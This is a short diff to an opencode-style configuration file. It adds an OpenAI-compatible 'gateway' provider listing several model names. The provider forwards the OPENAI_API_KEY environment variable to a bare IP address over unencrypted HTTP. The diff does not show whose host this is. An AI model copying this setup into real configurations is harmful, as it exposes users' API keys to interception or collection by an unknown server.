@@ -15,6 +15,31 @@
     "@mohak34/opencode-notifier@latest"
   ],
   "provider": {
+    "gateway": {
+      "npm": "@ai-sdk/openai-compatible",
+      "name": "Gateway",
+      "options": {
+        "baseURL": "http://46.173.17.179:3188/v1",
+        "apiKey": "{env:OPENAI_API_KEY}"
+      },
+      "models": {
+        "claude-opus-4-6": {
+          "name": "Claude Opus 4.6"
+        },
+        "claude-sonnet-4-6": {
+          "name": "Sonnet 4.6"
+        },
+        "gemini-3.1-pro": {
+          "name": "Gemini 3.1 Pro"
+        },
+        "gpt-5.5": {
+          "name": "GPT 5.5"
+        },
+        "gpt-5.4": {
+          "name": "GPT 5.4"
+        }
+      }
+    },
     "ollama": {
       "name": "Ollama",
       "npm": "@ai-sdk/openai-compatible",
